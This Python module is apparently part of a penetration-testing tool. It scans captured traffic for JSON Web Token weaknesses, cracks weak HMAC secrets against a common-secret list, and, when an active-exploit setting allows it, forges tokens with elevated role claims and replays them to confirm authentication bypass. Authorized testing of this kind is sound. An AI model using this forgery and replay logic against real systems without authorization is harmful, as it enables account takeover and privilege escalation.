"""JWT weakness analysis over captured traffic (Tier-1, high signal).

We already capture authenticated traffic through the proxy; JSON Web Tokens
appear in Authorization headers, cookies and bodies. A weak token is frequently
a one-step account takeover, so this is high-value and low-noise.

For every distinct JWT we see we check, entirely offline (no requests sent):
  * alg=none            -> signature can be stripped (critical).
  * HS256/384/512       -> try to crack the HMAC secret against a small list of
                           common/default secrets (safe, local) -> forge any token.
  * kid / jku / x5u     -> header injection surface (algorithm confusion / SSRF).
  * missing exp         -> token never expires.
  * sensitive claims    -> role/admin/scope present -> tampering target.

Stored as a synthetic job (tool="jwt").
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
from typing import Any, Dict, List, Optional, Tuple

from app.analysis._store import save_analysis_job
from app.engagements import EngagementRepository
from app.proxy import FlowRepository
from app.scans.models import Finding

logger = logging.getLogger("syphax.analysis.jwt")

MAX_FLOWS = 1000
MAX_BODY = 256 * 1024
_JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]{2,}\.eyJ[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]*")

# Small, safe wordlist of common/default HMAC secrets (local brute force only).
_COMMON_SECRETS = [
    "secret", "secretkey", "secret_key", "jwt_secret", "jwtsecret", "your-256-bit-secret",
    "password", "changeme", "admin", "test", "key", "private", "mysecret", "supersecret",
    "123456", "qwerty", "token", "jwt", "auth", "default", "s3cr3t", "Sn1f", "0",
    "your_jwt_secret", "JWT_SECRET", "secretKey", "shhhh", "topsecret", "p@ssw0rd",
    "HS256", "secret123", "access_token_secret", "refreshsecret", "node", "express",
]

_SENSITIVE_CLAIMS = ("role", "roles", "admin", "is_admin", "isadmin", "scope",
                     "scopes", "permissions", "authorities", "grp", "group", "tier")


async def analyze_jwt(engagement_id: str) -> Dict[str, int]:
    eng = await EngagementRepository().get(engagement_id)
    if eng is None:
        return {"error": 1}

    flows_repo = FlowRepository()
    summaries = await flows_repo.list_flows(limit=MAX_FLOWS)
    from urllib.parse import urlparse
    in_scope = [f for f in summaries
                if eng.host_in_scope((urlparse(f.url).hostname or "").lower())]

    from app.validation.safe_poc import SafePoC
    safe = SafePoC(in_scope=eng.host_in_scope)
    findings: List[Finding] = []
    seen: set[str] = set()
    replayed = 0

    for f in in_scope[:300]:
        full = await flows_repo.get_flow(f.id)
        if not full:
            continue
        for token in _collect_tokens(full):
            head, payload = _decode(token)
            if head is None:
                continue
            sig = token.split(".")[0]  # stable-enough dedupe key (header+alg)
            dedupe = sig + ":" + ",".join(sorted((payload or {}).keys()))
            if dedupe in seen:
                continue
            seen.add(dedupe)
            findings.extend(_assess(token, head, payload or {}, f.url))

        # Forge-and-replay: prove a weak request JWT is actually forgeable by
        # minting a token and replaying it against the same endpoint. Minting a
        # token and sending it is an active authentication-bypass attempt, so it
        # is gated on allow_active_exploit; the offline _assess weakness
        # detection above always runs.
        if eng.allow_active_exploit and replayed < 25:
            bearer = _request_bearer(full)
            if bearer:
                fr = await _forge_replay(safe, f.url, bearer,
                                         allow_elevate=eng.allow_active_exploit)
                if fr is not None:
                    replayed += 1
                    findings.append(fr)

    await save_analysis_job(engagement_id, "jwt", findings, target="(JWT tokens)")

    crit = sum(1 for x in findings if x.severity in ("critical", "high"))
    logger.info("[%s] jwt: distinct=%d findings=%d (high/crit=%d)",
                engagement_id, len(seen), len(findings), crit)
    return {"jwt_tokens": len(seen), "findings": len(findings)}


# --------------------------------------------------------------------------- #

def _request_bearer(full: Dict[str, Any]) -> Optional[str]:
    """The Bearer JWT in the request Authorization header, if any."""
    for n, v in (full.get("request_headers") or []):
        if str(n).lower() == "authorization":
            m = _JWT_RE.search(str(v))
            if m and str(v).lower().startswith("bearer "):
                return m.group(0)
    return None


async def _forge_replay(safe, url, token, *, allow_elevate):
    """Mint a forged token (alg=none or re-signed with a cracked secret) and
    replay it read-only. Confirmed only if the forged token is accepted (200)
    while a control token with an invalid signature is rejected."""
    from app.jwt_forge import decode_parts, elevate, forge_hs, forge_none
    # ScopeError was caught below without ever being imported: an out-of-scope
    # URL raised NameError out of this function instead of returning None, so
    # the whole JWT proof pass died on the first host outside the engagement.
    from app.validation.safe_poc import ScopeError

    head, payload = decode_parts(token)
    if head is None:
        return None
    alg = str(head.get("alg", "")).lower()

    secret = _crack_hs(token) if alg.startswith("hs") else None
    if alg not in ("none", "") and not secret:
        return None  # not forgeable by us

    new_payload = elevate(payload) if allow_elevate else dict(payload)
    if not allow_elevate:
        new_payload["syphax_forge"] = "1"  # benign marker -> distinct token
    forged = forge_none(new_payload) if alg in ("none", "") else forge_hs(head, new_payload, secret)
    control = token.rsplit(".", 1)[0] + ".aXhkInvalidSignature"

    try:
        ctrl = await safe.fetch(url, method="GET", headers={"Authorization": f"Bearer {control}"})
        forged_resp = await safe.fetch(url, method="GET", headers={"Authorization": f"Bearer {forged}"})
    except ScopeError:
        return None
    if forged_resp is None or forged_resp.status_code != 200 or len(forged_resp.text) == 0:
        return None
    if ctrl is not None and ctrl.status_code == 200:
        return None  # endpoint accepts anything -> not a JWT-validation proof

    how = "alg=none (unsigned)" if alg in ("none", "") else f"re-signed with cracked secret '{secret}'"
    sev = "critical"
    note = " with elevated role claims" if allow_elevate else ""
    return Finding(
        severity=sev,
        title=f"JWT forgery confirmed on {url}",
        description="A forged token was accepted by the server (a control token "
                    "with an invalid signature was rejected).",
        target=url,
        evidence=(f"Forged token {how}{note} -> HTTP 200 ({len(forged_resp.text)} bytes); "
                  f"control (bad signature) -> HTTP {ctrl.status_code if ctrl else 'n/a'}."),
        metadata={"vuln_class": "jwt", "status": "confirmed", "confidence": 0.95,
                  "kind": "forge_replay", "alg": alg},
    )


def _collect_tokens(full: Dict[str, Any]) -> List[str]:
    out: List[str] = []
    for hdrs in (full.get("request_headers") or [], full.get("response_headers") or []):
        for _n, v in hdrs:
            out.extend(_JWT_RE.findall(str(v)))
    for key in ("request_body_preview", "response_body_preview"):
        body = full.get(key) or {}
        if body.get("encoding") == "text":
            out.extend(_JWT_RE.findall((body.get("text") or "")[:MAX_BODY]))
    return out


def _b64url(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _decode(token: str) -> Tuple[Optional[dict], Optional[dict]]:
    try:
        h, p, _sig = token.split(".")
        header = json.loads(_b64url(h))
        payload = json.loads(_b64url(p))
        if not isinstance(header, dict):
            return None, None
        return header, payload if isinstance(payload, dict) else {}
    except Exception:  # noqa: BLE001
        return None, None


def _crack_hs(token: str) -> Optional[str]:
    """Try to recover an HMAC secret from a tiny common-secret list (offline)."""
    try:
        h, p, sig = token.split(".")
    except ValueError:
        return None
    signing_input = f"{h}.{p}".encode()
    try:
        want = _b64url(sig)
    except Exception:  # noqa: BLE001
        return None
    alg = (json.loads(_b64url(h)).get("alg") or "").upper()
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}.get(alg)
    if digest is None:
        return None
    for secret in _COMMON_SECRETS:
        mac = hmac.new(secret.encode(), signing_input, digest).digest()
        if hmac.compare_digest(mac, want):
            return secret
    return None


def _assess(token: str, header: dict, payload: dict, url: str) -> List[Finding]:
    out: List[Finding] = []
    alg = str(header.get("alg") or "").lower()
    short = token[:24] + "..."

    def mk(sev, vclass, title, desc, status, conf, poc=""):
        return Finding(severity=sev, title=title, description=desc, target=url,
                       evidence=poc or f"token {short} (alg={alg}) seen at {url}",
                       metadata={"vuln_class": vclass, "status": status,
                                 "confidence": conf, "alg": alg, "jwt_alg": alg})

    if alg in ("none", ""):
        out.append(mk("critical", "jwt", "JWT accepts alg=none",
                      "The token uses alg=none; an attacker can strip the signature "
                      "and forge arbitrary claims.", "likely", 0.7))

    if alg.startswith("hs"):
        secret = _crack_hs(token)
        if secret is not None:
            out.append(mk("critical", "jwt", "JWT signed with a weak/known HMAC secret",
                          f"The HS* signing secret was recovered offline ('{secret}'); "
                          "any token (incl. admin) can be forged.", "confirmed", 0.95,
                          poc=f"HMAC secret '{secret}' validates the signature of {short}."))

    if any(k in header for k in ("kid", "jku", "x5u")):
        keys = ", ".join(k for k in ("kid", "jku", "x5u") if k in header)
        out.append(mk("medium", "jwt", f"JWT header injection surface ({keys})",
                      "Header parameters that point at a key (kid/jku/x5u) can enable "
                      "algorithm confusion or SSRF to a key the attacker controls.",
                      "unconfirmed", 0.35))

    if "exp" not in payload:
        out.append(mk("low", "jwt", "JWT has no expiry (exp)",
                      "The token carries no exp claim; a leaked token is valid forever.",
                      "likely", 0.5))

    present = [c for c in _SENSITIVE_CLAIMS if c in payload]
    if present and not any(f.metadata.get("status") == "confirmed" for f in out):
        out.append(mk("info", "jwt", f"JWT carries authorization claims ({', '.join(present)})",
                      "Authorization decisions ride in the token; combined with any "
                      "signature weakness this is a privilege-escalation target.",
                      "unconfirmed", 0.3))
    return out
